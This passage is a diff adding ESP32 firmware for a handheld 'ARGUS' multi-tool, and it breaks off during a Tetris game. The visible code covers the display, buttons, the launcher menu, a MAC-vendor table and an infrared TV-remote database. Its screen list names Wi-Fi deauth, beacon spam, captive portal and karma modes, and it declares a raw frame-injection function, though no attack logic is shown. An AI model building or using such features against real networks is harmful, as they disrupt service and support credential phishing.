@@ -1,0 +1,2136 @@
+#include <Arduino.h>
+#include <SPI.h>
+#include <Wire.h>
+#include <WiFi.h>
+#include "esp_wifi.h"
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_ST7735.h>
+#include <Adafruit_NeoPixel.h>
+#include <IRremoteESP8266.h>
+#include <IRrecv.h>
+#include <IRsend.h>
+#include <IRutils.h>
+#include <esp_now.h>
+#include <SD.h>
+#include <FS.h>
+
+extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+
+// ================= PINS (ESP32-S3) =================
+constexpr int TFT_CS   = 10;
+constexpr int TFT_RST  = 8;
+constexpr int TFT_DC   = 9;
+constexpr int TFT_BL   = 7;
+constexpr int BTN_BACK   = 15;
+constexpr int BTN_NEXT   = 4;
+constexpr int BTN_SELECT = 5;
+constexpr int BUZZER_PIN = 16;
+constexpr int IR_PIN     = 1;
+// SD card module shares the TFT's SPI bus (SCK=12, MOSI=11, MISO=21);
+// only the chip-select pin is dedicated to the SD module.
+constexpr int SD_CS = 13;
+// Onboard addressable RGB LED on many ESP32-S3 boards. Change if your board uses another pin.
+constexpr int RGB_LED_PIN = 48;
+constexpr uint16_t RGB_LED_COUNT = 1;
+
+// ================= COLORS =================
+constexpr uint16_t COL_BG      = 0x0000;
+constexpr uint16_t COL_ACCENT  = 0xFC00;
+constexpr uint16_t COL_ACCENT2 = 0xFD20;
+constexpr uint16_t COL_DIM     = 0x7BEF;
+constexpr uint16_t COL_TEXT    = 0xFFFF;
+constexpr uint16_t COL_WARN    = 0xFC00;
+constexpr uint16_t COL_OK      = 0xFD20;
+
+// ================= OBJECTS =================
+Adafruit_ST7735 tft(TFT_CS, TFT_DC, TFT_RST);
+IRsend irsend(IR_PIN);
+IRrecv irrecv(IR_PIN);
+decode_results irResults;
+WebServer portalServer(80);
+DNSServer dnsServer;
+Adafruit_NeoPixel rgbLed(RGB_LED_COUNT, RGB_LED_PIN, NEO_GRB + NEO_KHZ800);
+
+// ================= ENUMS =================
+enum Screen {
+MAIN, WIFI_MENU, WIFI_SCAN, WIFI_INFO, WIFI_STATUS, WIFI_HOTSPOT,
+BEACON_SPAM, CAPTIVE_PORTAL, SNIFFER, DEAUTH, RADAR, DEAUTH_DETECTOR, KARMA,
+IR_MENU, IR_TV_BRANDS, IR_TV_MODELS, IR_TV_REMOTE,
+IR_RECEIVE, IR_SAVED,
+DISPLAY_TEST, INFO, SETTINGS, ARGUS_HUB, RGB_MENU, TETRIS_GAME, ARGUS_LINK
+};
+
+enum IRProtocol {
+IR_PROTO_NEC, IR_PROTO_SAMSUNG, IR_PROTO_LG,
+IR_PROTO_SONY, IR_PROTO_PANASONIC, IR_PROTO_SHARP, IR_PROTO_RC5
+};
+
+struct IRCommand { const char* name; IRProtocol protocol; uint64_t code; uint16_t bits; uint16_t repeat; };
+struct IRModel   { const char* name; const char* note; const IRCommand* commands; uint8_t commandCount; };
+struct IRBrand   { const char* name; const IRModel* models; uint8_t modelCount; };
+
+// ================= GLOBALS =================
+Screen screen = MAIN;
+Screen prevScreen = MAIN;
+bool screenEntered = true;
+
+int mainItem = 0, wifiItem = 0, networkItem = 0, networkCount = 0;
+int argusItem = 0, infoPage = 0;
+int settingsItem = 0;
+int irBrandItem = 0, irModelItem = 0, irCommandItem = 0;
+int irSavedIdx = 0, irSavedCount = 0;
+
+unsigned long lastButton[3] = {0, 0, 0};
+constexpr uint32_t DEBOUNCE_MS = 180;
+unsigned long irToastUntil = 0;
+const char* irToastText = "";
+uint32_t lastIrSend = 0;
+constexpr uint32_t IR_SEND_GUARD_MS = 120;
+
+bool apActive = false;
+bool buzzerEnabled = true;
+int brightnessLevel = 3;
+constexpr int BRIGHTNESS_LEVELS = 5;
+const int brightnessValues[BRIGHTNESS_LEVELS] = {30, 90, 150, 210, 255};
+
+unsigned long irLastReceive = 0;
+bool irRecvActive = false;
+
+// ================= FORWARD =================
+void clearScreen(uint16_t c = COL_BG);
+void text(const char* s, int x, int y, uint16_t c, uint8_t size = 1);
+void centerText(const char* s, int y, uint16_t c, uint8_t size = 1);
+void header(const char* s, int iconId = -1);
+void menuItem(int y, const char* s, bool sel);
+void message(const char* title, const char* a, const char* b, uint16_t c = COL_TEXT);
+void truncateTo(const char* src, char* out, int maxChars);
+const char* ouiVendor(const uint8_t* mac);
+void applyBrightness();
+void irRecvStart();
+void irRecvStop();
+void drawIcon(int id, int x, int y, uint16_t color, int size); // Исправлено: убран default arg
+
+// ================= ICON DRAWINGS =================
+void drawIcon(int id, int x, int y, uint16_t color, int size) {
+  // Compact line-art icons designed for the 160x128 ST7735 screen.
+  if (size < 1) size = 1;
+  switch (id) {
+    case 0: { // Wi-Fi signal
+      for (int arc = 0; arc < 3; ++arc) {
+        int r = size * (4 + arc * 3);
+        int lastX = 0, lastY = 0;
+        bool haveLast = false;
+        for (int deg = 225; deg <= 315; deg += 5) {
+          float a = deg * PI / 180.0f;
+          int px = x + (int)(cosf(a) * r);
+          int py = y + (int)(sinf(a) * r);
+          if (haveLast) tft.drawLine(lastX, lastY, px, py, color);
+          lastX = px; lastY = py; haveLast = true;
+        }
+      }
+      tft.fillCircle(x, y + size * 2, size, color);
+      break;
+    }
+    case 1: { // IR remote with IR rays
+      int w = size * 8, h = size * 15;
+      tft.drawRoundRect(x - w/2, y - h/2, w, h, size * 2, color);
+      tft.drawCircle(x, y - size*4, size, color);
+      tft.fillCircle(x, y - size*4, max(1, size/2), color);
+      tft.fillCircle(x, y, max(1, size/2), color);
+      tft.fillCircle(x, y + size*3, max(1, size/2), color);
+      // IR rays above the remote
+      tft.drawLine(x - size*6, y - size*10, x - size*8, y - size*12, color);
+      tft.drawLine(x, y - size*10, x, y - size*13, color);
+      tft.drawLine(x + size*6, y - size*10, x + size*8, y - size*12, color);
+      break;
+    }
+    case 2: { // Gear
+      tft.drawCircle(x, y, size*6, color);
+      tft.drawCircle(x, y, size*3, color);
+      for (int i=0; i<8; ++i) {
+        float a = i * PI / 4.0f;
+        tft.drawLine(x + (int)(cosf(a)*size*6), y + (int)(sinf(a)*size*6),
+                     x + (int)(cosf(a)*size*9), y + (int)(sinf(a)*size*9), color);
+      }
+      break;
+    }
+    case 3: { // Info
+      tft.drawCircle(x, y, size*7, color);
+      tft.fillCircle(x, y-size*3, max(1,size), color);
+      tft.fillRoundRect(x-size, y-size, size*2, size*6, size, color);
+      break;
+    }
+    case 4: { // Radar
+      for (int r=size*3; r<=size*9; r+=size*3) tft.drawCircle(x,y,r,color);
+      tft.drawFastHLine(x-size*9,y,size*18,color);
+      tft.drawFastVLine(x,y-size*9,size*18,color);
+      tft.drawLine(x,y,x+size*7,y-size*6,color);
+      tft.fillCircle(x,y,size,color);
+      break;
+    }
+    case 5: { // Tools / wrench
+      tft.drawCircle(x-size*3,y-size*4,size*3,color);
+      tft.drawCircle(x-size*3,y-size*4,size,color);
+      tft.drawLine(x-size,y-size*2,x+size*6,y+size*6,color);
+      tft.drawLine(x+size*3,y+size*6,x+size*7,y+size*2,color);
+      tft.drawLine(x+size*4,y+size*7,x+size*7,y+size*4,color);
+      break;
+    }
+    case 7: { // RGB LED symbol
+      tft.drawCircle(x, y, size*6, color);
+      tft.fillCircle(x-size*3, y, size, color);
+      tft.fillCircle(x, y-size*3, size, color);
+      tft.fillCircle(x+size*3, y, size, color);
+      tft.fillCircle(x, y+size*3, size, color);
+      break;
+    }
+    case 6: { // ARGUS: eye inside a targeting frame
+      tft.drawRoundRect(x-size*11,y-size*8,size*22,size*16,size*3,color);
+      tft.drawLine(x-size*8,y,x-size*3,y-size*4,color);
+      tft.drawLine(x-size*3,y-size*4,x,y-size*5,color);
+      tft.drawLine(x,y-size*5,x+size*3,y-size*4,color);
+      tft.drawLine(x+size*3,y-size*4,x+size*8,y,color);
+      tft.drawLine(x-size*8,y,x-size*3,y+size*4,color);
+      tft.drawLine(x-size*3,y+size*4,x,y+size*5,color);
+      tft.drawLine(x,y+size*5,x+size*3,y+size*4,color);
+      tft.drawLine(x+size*3,y+size*4,x+size*8,y,color);
+      tft.drawCircle(x,y,size*3,color);
+      tft.fillCircle(x,y,size,color);
+      tft.fillCircle(x+size,y-size, max(1,size/2), COL_TEXT);
+      break;
+    }
+  }
+}
+
+// ================= SPI =================
+inline void spiToTFT() { digitalWrite(TFT_CS, LOW); }
+
+// ================= BUZZER =================
+void toneRaw(uint16_t freq, uint16_t dur) {
+if (!buzzerEnabled || freq == 0) { delay(dur); return; }
+ledcWriteTone(BUZZER_PIN, freq);
+delay(dur);
+ledcWriteTone(BUZZER_PIN, 0);
+}
+void beepNav()     { toneRaw(2000, 25); }
+void beepSelect()  { toneRaw(2800, 50); }
+void beepBack()    { toneRaw(1500, 40); }
+void beepError()   { toneRaw(800, 120); }
+void beepSuccess() { toneRaw(2500, 60); delay(20); toneRaw(3200, 60); }
+void playBootMelody() {
+const uint16_t n[] = {523,659,784,1047};
+const uint16_t d[] = {100,100,100,300};
+for (int i = 0; i < 4; i++) toneRaw(n[i], d[i]);
+}
+void playAttackAlarm() { toneRaw(3000,80); toneRaw(2000,80); toneRaw(3000,80); }
+void playSnifferPing() { toneRaw(2400,25); }
+void playIRCue()       { toneRaw(3000,40); }
+
+void applyBrightness() {
+if (brightnessLevel < 0) brightnessLevel = 0;
+if (brightnessLevel >= BRIGHTNESS_LEVELS) brightnessLevel = BRIGHTNESS_LEVELS - 1;
+ledcAttach(TFT_BL, 5000, 8);
+ledcWrite(TFT_BL, brightnessValues[brightnessLevel]);
+}
+
+// ================= BUTTONS =================
+bool backPressed() {
+if (digitalRead(BTN_BACK) == LOW && millis() - lastButton[0] > DEBOUNCE_MS) {
+lastButton[0] = millis(); beepBack(); return true;
+}
+return false;
+}
+bool nextPressed() {
+if (digitalRead(BTN_NEXT) == LOW && millis() - lastButton[1] > DEBOUNCE_MS) {
+lastButton[1] = millis(); beepNav(); return true;
+}
+return false;
+}
+bool selectPressed() {
+if (digitalRead(BTN_SELECT) == LOW && millis() - lastButton[2] > DEBOUNCE_MS) {
+lastButton[2] = millis(); beepSelect(); return true;
+}
+return false;
+}
+
+// ================= DRAW HELPERS =================
+void clearScreen(uint16_t c) { tft.fillScreen(c); }
+void text(const char* s, int x, int y, uint16_t c, uint8_t size) {
+tft.setTextColor(c); tft.setTextSize(size); tft.setCursor(x, y); tft.print(s);
+}
+void centerText(const char* s, int y, uint16_t c, uint8_t size) {
+int w = strlen(s) * 6 * size;
+int x = (160 - w) / 2; if (x < 0) x = 0;
+text(s, x, y, c, size);
+}
+void truncateTo(const char* src, char* out, int maxChars) {
+int len = strlen(src);
+if (len <= maxChars) { strcpy(out, src); return; }
+if (maxChars <= 2) { strncpy(out, src, maxChars); out[maxChars] = '\0'; return; }
+strncpy(out, src, maxChars - 2);
+out[maxChars - 2] = '.'; out[maxChars - 1] = '.'; out[maxChars] = '\0';
+}
+void header(const char* s, int iconId) {
+tft.fillRect(0, 0, 160, 22, COL_ACCENT);
+tft.setTextColor(COL_BG); tft.setTextSize(1);
+tft.setCursor(28, 7); tft.print(s);
+if (iconId >= 0) drawIcon(iconId, 14, 11, COL_BG, 1);
+tft.drawFastHLine(0, 22, 160, COL_ACCENT2);
+}
+void menuItem(int y, const char* s, bool sel) {
+if (sel) {
+tft.fillRoundRect(4, y - 3, 152, 18, 4, COL_ACCENT);
+tft.setTextColor(COL_BG); tft.setCursor(10, y); tft.print(">");
+tft.setCursor(22, y); tft.print(s);
+} else {
+tft.setTextColor(COL_ACCENT2); tft.setCursor(22, y); tft.print(s);
+}
+}
+void message(const char* title, const char* a, const char* b, uint16_t c) {
+clearScreen();
+centerText(title, 45, COL_ACCENT, 2);
+if (a) centerText(a, 75, c);
+if (b) centerText(b, 90, c);
+}
+
+// ================= OUI =================
+const char* ouiVendor(const uint8_t* mac) {
+struct OUI { uint8_t a,b; const char* v; };
+static const OUI table[] = {
+{0x08,0x95,"Espressif"},{0x24,0x62,"Espressif"},{0x30,0xAE,"Espressif"},
+{0x34,0xAB,"Espressif"},{0x3C,0x61,"Espressif"},{0x48,0x3F,"Espressif"},
+{0x54,0x5A,"Espressif"},{0x68,0xC6,"Espressif"},{0x84,0xCC,"Espressif"},
+{0x8C,0xAA,"Espressif"},{0xA4,0xCF,"Espressif"},{0xB4,0xE6,"Espressif"},
+{0xBC,0xDD,"Espressif"},{0xC4,0x4F,"Espressif"},{0xCC,0x50,"Espressif"},
+{0xD8,0xA0,"Espressif"},{0xEC,0x94,"Espressif"},
+{0x00,0x1A,"Samsung"},{0x04,0x18,"Samsung"},{0x08,0x37,"Samsung"},
+{0x0C,0x71,"Samsung"},{0x10,0xD5,"Samsung"},{0x14,0x49,"Samsung"},
+{0x18,0x3A,"Samsung"},{0x1C,0x5A,"Samsung"},{0x20,0x13,"Samsung"},
+{0x24,0x4B,"Samsung"},{0x28,0x39,"Samsung"},{0x2C,0x44,"Samsung"},
+{0x30,0x19,"Samsung"},{0x34,0x23,"Samsung"},{0x38,0xAA,"Samsung"},
+{0x3C,0x5A,"Samsung"},{0x40,0x0E,"Samsung"},{0x44,0x4E,"Samsung"},
+{0x48,0x13,"Samsung"},{0x4C,0x3C,"Samsung"},{0x50,0x32,"Samsung"},
+{0x54,0x92,"Samsung"},{0x58,0x21,"Samsung"},{0x5C,0x0A,"Samsung"},
+{0x60,0x6B,"Samsung"},{0x64,0xB8,"Samsung"},{0x68,0xEB,"Samsung"},
+{0x6C,0x2F,"Samsung"},{0x70,0xF9,"Samsung"},{0x74,0x45,"Samsung"},
+{0x78,0x1F,"Samsung"},{0x7C,0x61,"Samsung"},{0x80,0x57,"Samsung"},
+{0x84,0x25,"Samsung"},{0x88,0x32,"Samsung"},{0x8C,0x77,"Samsung"},
+{0x90,0x18,"Samsung"},{0x94,0x35,"Samsung"},{0x98,0x0C,"Samsung"},
+{0x9C,0x02,"Samsung"},{0xA0,0x21,"Samsung"},{0xA4,0xEB,"Samsung"},
+{0xA8,0x06,"Samsung"},{0xAC,0x5F,"Samsung"},{0xB0,0xDF,"Samsung"},
+{0xB4,0x79,"Samsung"},{0xB8,0x5E,"Samsung"},{0xBC,0x14,"Samsung"},
+{0xC0,0xBD,"Samsung"},{0xC4,0x57,"Samsung"},{0xC8,0x19,"Samsung"},
+{0xCC,0x07,"Samsung"},{0xD0,0x22,"Samsung"},{0xD4,0x87,"Samsung"},
+{0xD8,0x57,"Samsung"},{0xDC,0x71,"Samsung"},{0xE0,0x99,"Samsung"},
+{0xE4,0x40,"Samsung"},{0xE8,0x03,"Samsung"},{0xEC,0x1F,"Samsung"},
+{0xF0,0x25,"Samsung"},{0xF4,0x9F,"Samsung"},{0xF8,0x04,"Samsung"},
+{0xFC,0xA1,"Samsung"},
+{0x00,0x1B,"Apple"},{0x00,0x23,"Apple"},{0x00,0x25,"Apple"},
+{0x00,0x26,"Apple"},{0x00,0x50,"Apple"},
+{0x18,0xA6,"TP-Link"},{0x50,0xC7,"TP-Link"},
+};
+for (unsigned i = 0; i < sizeof(table)/sizeof(table[0]); i++)
+if (mac[0]==table[i].a && mac[1]==table[i].b) return table[i].v;
+return "Unknown";
+}
+
+// ================= IR DATABASE =================
+const IRCommand irTclCommands[] = {
+{"POWER",IR_PROTO_NEC,0x40BF12EDULL,32,0},{"MUTE",IR_PROTO_NEC,0x40BF926DULL,32,0},
+{"SOURCE",IR_PROTO_NEC,0x40BFB04FULL,32,0},{"VOL +",IR_PROTO_NEC,0x40BFA05FULL,32,0},
+{"VOL -",IR_PROTO_NEC,0x40BFF00FULL,32,0},{"CH +",IR_PROTO_NEC,0x40BF02FDULL,32,0},
+{"CH -",IR_PROTO_NEC,0x40BF22DDULL,32,0},{"PLAY/PAUSE",IR_PROTO_NEC,0x40BFC23DULL,32,0},
+{"0",IR_PROTO_NEC,0x40BF6897ULL,32,0},{"1",IR_PROTO_NEC,0x40BF30CFULL,32,0},
+{"2",IR_PROTO_NEC,0x40BF18E7ULL,32,0},{"3",IR_PROTO_NEC,0x40BF7A85ULL,32,0},
+{"4",IR_PROTO_NEC,0x40BF10EFULL,32,0},{"5",IR_PROTO_NEC,0x40BF38C7ULL,32,0},
+{"6",IR_PROTO_NEC,0x40BF5AA5ULL,32,0},{"7",IR_PROTO_NEC,0x40BF42BDULL,32,0},
+{"8",IR_PROTO_NEC,0x40BF4AB5ULL,32,0},{"9",IR_PROTO_NEC,0x40BF52ADULL,32,0}
+};
+const IRCommand irSamsungCommands[] = {
+{"POWER",IR_PROTO_SAMSUNG,0xE0E040BFULL,32,0},{"MUTE",IR_PROTO_SAMSUNG,0xE0E0F00FULL,32,0},
+{"SOURCE",IR_PROTO_SAMSUNG,0xE0E0807FULL,32,0},{"VOL +",IR_PROTO_SAMSUNG,0xE0E0E01FULL,32,0},
+{"VOL -",IR_PROTO_SAMSUNG,0xE0E0D02FULL,32,0},{"CH +",IR_PROTO_SAMSUNG,0xE0E048B7ULL,32,0},
+{"CH -",IR_PROTO_SAMSUNG,0xE0E008F7ULL,32,0}
+};
+const IRCommand irLgCommands[] = {
+{"POWER",IR_PROTO_LG,0x20DF10EFULL,32,0},{"MUTE",IR_PROTO_LG,0x20DF906FULL,32,0},
+{"SOURCE",IR_PROTO_LG,0x20DFD02FULL,32,0},{"VOL +",IR_PROTO_LG,0x20DF40BFULL,32,0},
+{"VOL -",IR_PROTO_LG,0x20DFC03FULL,32,0},{"CH +",IR_PROTO_LG,0x20DF00FFULL,32,0},
+{"CH -",IR_PROTO_LG,0x20DF807FULL,32,0}
+};
+const IRCommand irSonyCommands[] = {
+{"POWER",IR_PROTO_SONY,0x0A90ULL,12,2},{"MUTE",IR_PROTO_SONY,0x0290ULL,12,2},
+{"VOL +",IR_PROTO_SONY,0x0490ULL,12,2},{"VOL -",IR_PROTO_SONY,0x0C90ULL,12,2},
+{"CH +",IR_PROTO_SONY,0x0090ULL,12,2},{"CH -",IR_PROTO_SONY,0x0890ULL,12,2}
+};
+const IRCommand irPanasonicCommands[] = { {"POWER",IR_PROTO_PANASONIC,0x40040100BCBDULL,48,0} };
+const IRCommand irSharpCommands[] = { {"POWER",IR_PROTO_SHARP,0x40BFULL,15,0} };
+
+const IRModel irTclModels[]  = {{"50P615 / RC802N","Known TCL profile",irTclCommands,sizeof(irTclCommands)/sizeof(irTclCommands[0])}};
+const IRModel irSamsungModels[]={{"Common 32-bit","Common Samsung profile",irSamsungCommands,sizeof(irSamsungCommands)/sizeof(irSamsungCommands[0])}};
+const IRModel irLgModels[]   = {{"Common 32-bit","Common LG profile",irLgCommands,sizeof(irLgCommands)/sizeof(irLgCommands[0])}};
+const IRModel irSonyModels[] = {{"SIRC 12-bit","Common Sony SIRC profile",irSonyCommands,sizeof(irSonyCommands)/sizeof(irSonyCommands[0])}};
+const IRModel irPanasonicModels[]={{"Kaseikyo 48-bit","Known Panasonic profile",irPanasonicCommands,sizeof(irPanasonicCommands)/sizeof(irPanasonicCommands[0])}};
+const IRModel irSharpModels[]= {{"15-bit raw","Known Sharp profile",irSharpCommands,sizeof(irSharpCommands)/sizeof(irSharpCommands[0])}};
+
+const IRBrand irBrands[] = {
+{"TCL",irTclModels,sizeof(irTclModels)/sizeof(irTclModels[0])},
+{"Samsung",irSamsungModels,sizeof(irSamsungModels)/sizeof(irSamsungModels[0])},
+{"LG",irLgModels,sizeof(irLgModels)/sizeof(irLgModels[0])},
+{"Sony",irSonyModels,sizeof(irSonyModels)/sizeof(irSonyModels[0])},
+{"Panasonic",irPanasonicModels,sizeof(irPanasonicModels)/sizeof(irPanasonicModels[0])},
+{"Sharp",irSharpModels,sizeof(irSharpModels)/sizeof(irSharpModels[0])}
+};
+const uint8_t IR_BRAND_COUNT = sizeof(irBrands)/sizeof(irBrands[0]);
+
+const IRModel& selectedIrModel()    { return irBrands[irBrandItem].models[irModelItem]; }
+const IRCommand& selectedIrCommand(){ return selectedIrModel().commands[irCommandItem]; }
+
+void sendIRCommand(const IRCommand& c) {
+uint32_t now = millis();
+if ((uint32_t)(now - lastIrSend) < IR_SEND_GUARD_MS) return;
+switch (c.protocol) {
+case IR_PROTO_NEC:        irsend.sendNEC(c.code,c.bits,c.repeat); break;
+case IR_PROTO_SAMSUNG:    irsend.sendSAMSUNG(c.code,c.bits,c.repeat); break;
+case IR_PROTO_LG:         irsend.sendLG(c.code,c.bits,c.repeat); break;
+case IR_PROTO_SONY:       irsend.sendSony(c.code,c.bits,c.repeat); break;
+case IR_PROTO_PANASONIC:  irsend.sendPanasonic64(c.code,c.bits,c.repeat); break;
+case IR_PROTO_SHARP:      irsend.sendSharpRaw(c.code,c.bits,c.repeat); break;
+case IR_PROTO_RC5:        irsend.sendRC5(c.code,c.bits,c.repeat); break;
+default: return;
+}
+lastIrSend = millis();
+playIRCue();
+}
+
+// ================= MAIN MENU =================
+// Minimal launcher: full-card icon only, no title/subtitle on cards.
+const int MAIN_APPS = 6; // Wi-Fi, IR, RGB, ARGUS hub, Tetris, ARGUS LINK
+unsigned long mainSlideStart = 0;
+int mainSlideDir = 0;
+const int SLIDE_DURATION = 130;
+
+void drawTopStatus() {
+  // Original ARGUS status bar: black background and orange accents only.
+  tft.fillRect(0, 0, 160, 23, COL_BG);
+  tft.setTextColor(COL_ACCENT);
+  tft.setTextSize(2);
+  tft.setCursor(7, 3);
+  tft.print("ARGUS");
+  tft.setTextSize(1);
+  tft.setTextColor(COL_ACCENT2);
+  tft.setCursor(112, 7);
+  tft.print("v2.0");
+  tft.drawFastHLine(0, 23, 160, COL_ACCENT);
+  tft.fillCircle(151, 11, 2, WiFi.getMode() == WIFI_OFF ? COL_DIM : COL_ACCENT2);
+}
+
+void drawDots() {
+  const int gap = 13;
+  const int startX = 60;
+  for (int i = 0; i < MAIN_APPS; i++) {
+    int x = startX + i * gap;
+    if (i == mainItem) tft.fillCircle(x, 120, 3, COL_ACCENT);
+    else tft.drawCircle(x, 120, 2, COL_ACCENT2);
+  }
+}
+
+void drawAppCard(int idx, int offsetX) {
+  // No title or subtitle inside the card: icon-only launcher.
+  const int x = offsetX, y = 31, w = 156, h = 79;
+  tft.fillRoundRect(x + 2, y + 2, w, h, 8, 0x2104);
+  tft.fillRoundRect(x, y, w, h, 8, COL_BG);
+  tft.drawRoundRect(x, y, w, h, 8, COL_ACCENT);
+
+  const int cx = x + w / 2;
+  const int cy = y + h / 2;
+  if (idx == 0) {
+    // Wi-Fi symbol only: three clean arcs and a dot. No radar circles.
+    for (int arc = 0; arc < 3; ++arc) {
+      const int r = 12 + arc * 10;
+      int px0 = 0, py0 = 0;
+      bool havePrev = false;
+      for (int deg = 225; deg <= 315; deg += 3) {
+        float a = deg * PI / 180.0f;
+        int px = cx + (int)(cosf(a) * r);
+        int py = cy + (int)(sinf(a) * r) - 2;
+        if (havePrev) tft.drawLine(px0, py0, px, py, COL_ACCENT2);
+        px0 = px; py0 = py; havePrev = true;
+      }
+    }
+    tft.fillCircle(cx, cy + 22, 3, COL_ACCENT2);
+  } else if (idx == 1) {
+    // IR remote icon, larger and centered.
+    drawIcon(1, cx, cy + 2, COL_ACCENT2, 2);
+  } else if (idx == 2) {
+    // RGB icon: four orange monochrome light points around a central LED.
+    tft.drawCircle(cx, cy, 19, COL_ACCENT2);
+    tft.fillCircle(cx, cy, 7, COL_ACCENT);
+    tft.fillCircle(cx, cy-17, 4, COL_ACCENT2);
+    tft.fillCircle(cx+17, cy, 4, COL_ACCENT2);
+    tft.fillCircle(cx, cy+17, 4, COL_ACCENT2);
+    tft.fillCircle(cx-17, cy, 4, COL_ACCENT2);
+  } else if (idx == 4) {
+    // Cute orange Tetris blocks icon.
+    tft.fillRoundRect(cx-30, cy-25, 28, 28, 4, 0xFD20);
+    tft.drawRoundRect(cx-30, cy-25, 28, 28, 4, COL_TEXT);
+    tft.fillRoundRect(cx-1, cy-25, 28, 28, 4, 0xFE6A);
+    tft.drawRoundRect(cx-1, cy-25, 28, 28, 4, COL_TEXT);
+    tft.fillRoundRect(cx-30, cy+4, 28, 18, 4, 0xFFDE);
+    tft.drawRoundRect(cx-30, cy+4, 28, 18, 4, COL_TEXT);
+    tft.fillRoundRect(cx-1, cy+4, 28, 18, 4, 0xFC80);
+    tft.drawRoundRect(cx-1, cy+4, 28, 18, 4, COL_TEXT);
+  } else if (idx == 5) {
+    // Wireless link icon.
+    tft.drawRoundRect(cx-25, cy-15, 32, 30, 7, COL_ACCENT2);
+    tft.drawRoundRect(cx-7, cy-15, 32, 30, 7, COL_ACCENT);
+    tft.drawLine(cx-4, cy, cx+4, cy, COL_TEXT);
+    tft.fillCircle(cx-16, cy, 3, COL_ACCENT2);
+    tft.fillCircle(cx+16, cy, 3, COL_ACCENT);
+  } else {
+    // ARGUS eye icon without a surrounding target/radar circle.
+    const int z = 2;
+    tft.drawLine(cx-30,cy,cx-15,cy-12,COL_ACCENT2);
+    tft.drawLine(cx-15,cy-12,cx,cy-16,COL_ACCENT2);
+    tft.drawLine(cx,cy-16,cx+15,cy-12,COL_ACCENT2);
+    tft.drawLine(cx+15,cy-12,cx+30,cy,COL_ACCENT2);
+    tft.drawLine(cx-30,cy,cx-15,cy+12,COL_ACCENT2);
+    tft.drawLine(cx-15,cy+12,cx,cy+16,COL_ACCENT2);
+    tft.drawLine(cx,cy+16,cx+15,cy+12,COL_ACCENT2);
+    tft.drawLine(cx+15,cy+12,cx+30,cy,COL_ACCENT2);
+    tft.drawCircle(cx,cy,8,COL_ACCENT2);
+    tft.fillCircle(cx,cy,4,COL_ACCENT);
+  }
+}
+
+void drawMainMenu() {
+  clearScreen(COL_BG);
+  drawTopStatus();
+  drawAppCard(mainItem, 2);
+  drawDots();
+}
+
+void tickMain(bool entered) {
+  if (entered) drawMainMenu();
+  if (mainSlideDir != 0) {
+    if (millis() - mainSlideStart >= SLIDE_DURATION) {
+      mainSlideDir = 0;
+      drawMainMenu();
+    }
+    return;
+  }
+  // NEXT moves one card to the right; BACK moves one card to the left.
+  if (nextPressed()) {
+    mainItem = (mainItem + 1) % MAIN_APPS;
+    mainSlideDir = 1;
+    mainSlideStart = millis();
+    drawMainMenu();
+    return;
+  }
+  if (backPressed()) {
+    mainItem = (mainItem + MAIN_APPS - 1) % MAIN_APPS;
+    mainSlideDir = -1;
+    mainSlideStart = millis();
+    drawMainMenu();
+    return;
+  }
+  if (selectPressed()) {
+    if (mainItem == 0) { wifiItem = 7; screen = WIFI_MENU; }
+    else if (mainItem == 1) screen = IR_MENU;
+    else if (mainItem == 2) { screen = RGB_MENU; }
+    else if (mainItem == 3) { argusItem = 0; screen = ARGUS_HUB; }
+    else if (mainItem == 4) { screen = TETRIS_GAME; }
+    else { screen = ARGUS_LINK; }
+  }
+}
+
+
+// ================= CUTE ORANGE TETRIS (ARGUS APP) =================
+namespace CuteTetris {
+  const int W=10, H=10, CELL=10, X=30, Y=17;
+  const uint16_t BG=0x10A2, PANEL=0x2124, ORANGE=0xFD20, PEACH=0xFE6A, CREAM=0xFFDE, GRID=0x39C7, GHOST=0x7BEF;
+  uint8_t board[H][W];
+  uint32_t score=0, lastFall=0, lastHorizontal=0, selectDownAt=0;
+  uint16_t lines=0;
+  uint8_t level=1, type=0, nextType=0, rot=0;
+  int8_t px=3, py=0;
+  bool over=false, selectWasDown=false, selectLongDone=false;
+  bool backWasDown=false, nextWasDown=false, comboWasDown=false;
+  int8_t bag[7]; uint8_t bagPos=7;
+  const int8_t shape[7][4][4][2] = {
+    {{{0,1},{1,1},{2,1},{3,1}},{{2,0},{2,1},{2,2},{2,3}},{{0,2},{1,2},{2,2},{3,2}},{{1,0},{1,1},{1,2},{1,3}}},
+    {{{1,0},{2,0},{1,1},{2,1}},{{1,0},{2,0},{1,1},{2,1}},{{1,0},{2,0},{1,1},{2,1}},{{1,0},{2,0},{1,1},{2,1}}},
+    {{{1,0},{0,1},{1,1},{2,1}},{{1,0},{1,1},{2,1},{1,2}},{{0,1},{1,1},{2,1},{1,2}},{{1,0},{0,1},{1,1},{1,2}}},
+    {{{1,0},{2,0},{0,1},{1,1}},{{1,0},{1,1},{2,1},{2,2}},{{0,1},{1,1},{2,1},{3,1}},{{0,0},{0,1},{1,1},{1,2}}},
+    {{{0,0},{1,0},{1,1},{2,1}},{{2,0},{1,1},{2,1},{1,2}},{{0,1},{1,1},{1,2},{2,2}},{{1,0},{0,1},{1,1},{0,2}}},
+    {{{0,0},{0,1},{1,1},{2,1}},{{1,0},{2,0},{1,1},{1,2}},{{0,1},{1,1},{2,1},{2,2}},{{1,0},{1,1},{0,2},{1,2}}},
+    {{{2,0},{0,1},{1,1},{2,1}},{{1,0},{1,1},{1,2},{2,2}},{{0,1},{1,1},{2,1},{0,2}},{{0,0},{1,0},{1,1},{1,2}}}
+  };
+  uint16_t colors[7]={0xFFDE,0xFE6A,0xFD20,0xFC80,0xFBE0,0xFB20,0xFD8A};
+
+  uint8_t takePiece(){
+    if(bagPos>=7){
+      for(uint8_t i=0;i<7;i++) bag[i]=i;
+      for(int i=6;i>0;i--){int j=random(i+1);int8_t t=bag[i];bag[i]=bag[j];bag[j]=t;}
+      bagPos=0;
+    }
+    return bag[bagPos++];
+  }
+  bool hit(int nx,int ny,int nr) {
+    for(int i=0;i<4;i++){
+      int xx=nx+shape[type][nr][i][0], yy=ny+shape[type][nr][i][1];
+      if(xx<0||xx>=W||yy>=H) return true;
+      if(yy>=0 && board[yy][xx]) return true;
+    }
+    return false;
+  }
+  void spawn(){
+    type=nextType; nextType=takePiece(); rot=0; px=3; py=0;
+    if(hit(px,py,rot)) over=true;
+    lastFall=millis();
+  }
+  void reset(){
+    memset(board,0,sizeof(board)); score=0; lines=0; level=1; over=false;
